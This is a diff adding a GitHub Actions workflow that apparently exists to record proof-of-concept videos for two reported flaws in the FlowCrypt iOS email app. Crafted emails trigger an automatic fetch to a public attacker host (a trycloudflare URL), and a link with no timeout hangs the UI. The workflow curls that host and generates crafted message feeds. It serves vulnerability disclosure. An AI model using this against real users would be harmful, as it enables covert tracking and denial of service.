@@ -1,0 +1,161 @@
+name: flowcrypt-ios-poc-video
+
+# Rekam PoC attachment-URL FlowCrypt iOS di iOS Simulator (GitHub Actions macOS runner).
+# Build app mengikuti build_simulator.yml yang sudah TERBUKTI sukses di repo ini
+# (objectVersion sed + ad-hoc signing + Xcode terbaru).
+# Artifacts:
+#   demo_f1.mov   Finding 1: buka thread -> fetch otomatis ke attacker host publik
+#   demo_f2.mov   Finding 2: dos-hang -> UI hang (Data(contentsOf:) tanpa timeout)
+#   wdio logs + screenshots
+on:
+  workflow_dispatch:
+    inputs:
+      attacker_url:
+        description: "Base URL attacker publik (https://xxx.trycloudflare.com)"
+        required: true
+        default: "https://sentence-innovation-tasks-mia.trycloudflare.com"
+
+jobs:
+  poc:
+    runs-on: macos-15
+    timeout-minutes: 90
+    env:
+      ATTACKER_URL: ${{ github.event.inputs.attacker_url }}
+      RUNID: RUN-${{ github.run_id }}
+
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Pin commit yang di-report (MARKETING_VERSION 1.3.4)
+        run: |
+          git remote add upstream https://github.com/FlowCrypt/flowcrypt-ios.git || true
+          git fetch upstream master --tags --depth=5000
+          git checkout 2323e740318b96e69c507659d58a072d786b20ed
+          grep -m1 MARKETING_VERSION FlowCrypt.xcodeproj/project.pbxproj
+          sed -i '' 's/objectVersion = 100;/objectVersion = 77;/' FlowCrypt.xcodeproj/project.pbxproj
+          grep -m1 objectVersion FlowCrypt.xcodeproj/project.pbxproj
+
+      - name: Verify core bundle prebuilt is the vulnerable one (no host guard)
+        run: |
+          if grep -q "flowcrypt.s3.amazonaws.com" FlowCrypt/Resources/generated/flowcrypt-ios-prod.js.txt; then
+            echo "FATAL: guard ada di bundle, commit salah"; exit 1
+          else
+            echo "OK: guard TIDAK ada di bundle (sesuai temuan)"
+          fi
+
+      - name: Select newest Xcode
+        run: |
+          ls /Applications | grep -i xcode || true
+          XCODE_APP=$(ls -d /Applications/Xcode*.app | sort -V | tail -1)
+          echo "using $XCODE_APP"
+          sudo xcode-select -s "$XCODE_APP"
+          xcodebuild -version
+
+      - name: Force HTTPS for git@github.com submodules
+        run: |
+          git config --global url."https://github.com/".insteadOf "git@github.com:"
+          git config --global --add safe.directory '*'
+
+      - name: Build for simulator (ad-hoc signed)
+        run: |
+          xcodebuild -project FlowCrypt.xcodeproj \
+            -scheme "Debug FlowCrypt" \
+            -configuration Debug \
+            -sdk iphonesimulator \
+            -destination 'generic/platform=iOS Simulator' \
+            -derivedDataPath build \
+            -skipPackagePluginValidation \
+            -skipMacroValidation \
+            CODE_SIGN_IDENTITY="-" CODE_SIGNING_REQUIRED=YES CODE_SIGNING_ALLOWED=YES \
+            CODE_SIGN_ENTITLEMENTS=$PWD/FlowCrypt/FlowCrypt.entitlements build | tail -25
+          APP=$(find build/Build/Products -maxdepth 3 -name "*.app" | head -1)
+          echo "APP_PATH=$PWD/${APP#./}" >> "$GITHUB_ENV"
+          /usr/libexec/PlistBuddy -c "Print CFBundleIdentifier" "$APP/Info.plist"
+
+      - name: Boot simulator (pilih iPhone tersedia)
+        run: |
+          UDID=$(xcrun simctl list devices available | grep -m1 -E "iPhone (16|17|15)" | grep -oE "[0-9A-F-]{36}")
+          echo "SIM_UDID=$UDID" >> "$GITHUB_ENV"
+          xcrun simctl boot "$UDID"
+          xcrun simctl bootstatus "$UDID" -b
+          LINE=$(xcrun simctl list devices booted | grep "$UDID")
+          DEVNAME=$(echo "$LINE" | sed -E 's/.*(iPhone [0-9]+).*/\1/')
+          OSVER=$(echo "$LINE" | sed -E 's/.*\(([0-9.]+)\).*/\1/')
+          echo "POC_DEVICE_NAME=$DEVNAME" >> "$GITHUB_ENV"
+          echo "POC_IOS_VERSION=$OSVER" >> "$GITHUB_ENV"
+          echo "booted: $LINE"
+
+      - name: Install app
+        run: |
+          xcrun simctl install "$SIM_UDID" "$APP_PATH"
+          BID=$(/usr/libexec/PlistBuddy -c "Print CFBundleIdentifier" "$APP_PATH/Info.plist")
+          echo "BUNDLE_ID=$BID" >> "$GITHUB_ENV"
+          echo "installed: $BID"
+
+      - name: Pre-check attacker host dari runner
+        run: |
+          curl -s --max-time 25 "$ATTACKER_URL/open/PRECHECK-$RUNID" -o /dev/null -w "precheck HTTP %{http_code}\n"
+
+      - name: Setup appium harness + generate crafted feeds
+        run: |
+          cd appium
+          npm ci --no-audit --no-fund 2>&1 | tail -3 || npm install --no-audit --no-fund 2>&1 | tail -3
+          node ../poc/tools/gen_feed.js "$ATTACKER_URL" api-mocks/apis/google/exported-messages "$RUNID"
+          ls api-mocks/apis/google/exported-messages/ | grep poc || true
+
+      - name: Install PoC spec + wdio config
+        run: |
+          cp poc/tools/wdio.poc.conf.ts appium/config/wdio.poc.conf.ts
+          mkdir -p appium/tests/specs/mock/poc
+          cp poc/specs/poc_attachment.spec.ts appium/tests/specs/mock/poc/
+
+      # ================= FINDING 1 =================
+      - name: "Finding 1: rekam - buka thread -> fetch otomatis"
+        working-directory: appium
+        run: |
+          set -x
+          xcrun simctl io "$SIM_UDID" recordVideo --codec=h264 --force /tmp/demo_f1.mov &
+          REC=$!
+          sleep 3
+          CRAFTED_SUBJECT="POC attachment link F1" POC_MODE=f1 npx wdio ./config/wdio.poc.conf.ts \
+            --spec ./tests/specs/mock/poc/poc_attachment.spec.ts || echo "wdio rc=$? (video tetap disimpan)"
+          sleep 3
+          kill -INT $REC 2>/dev/null || true
+          sleep 4
+          ls -la /tmp/demo_f1.mov || true
+
+      # ================= FINDING 2 =================
+      - name: "Finding 2: rekam - dos-hang (UI hang)"
+        working-directory: appium
+        continue-on-error: true
+        run: |
+          set -x
+          xcrun simctl io "$SIM_UDID" recordVideo --codec=h264 --force /tmp/demo_f2.mov &
+          REC=$!
+          sleep 3
+          CRAFTED_SUBJECT="POC attachment link F2" POC_MODE=f2 npx wdio ./config/wdio.poc.conf.ts \
+            --spec ./tests/specs/mock/poc/poc_attachment.spec.ts || echo "wdio rc=$? (expected: hang/timeout)"
+          sleep 3
+          kill -INT $REC 2>/dev/null || true
+          sleep 4
+          ls -la /tmp/demo_f2.mov || true
+
+      - name: Collect bukti tambahan
+        if: always()
+        run: |
+          mkdir -p demo
+          xcrun simctl io "$SIM_UDID" screenshot demo/sim_final.png || true
+          ls -la /tmp/*.mov 2>/dev/null || true
+
+      - name: Upload artifacts
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: flowcrypt-poc-bukti-${{ github.run_id }}
+          path: |
+            /tmp/demo_f1.mov
+            /tmp/demo_f2.mov
+            demo/**
+            appium/tmp/**
+          if-no-files-found: warn
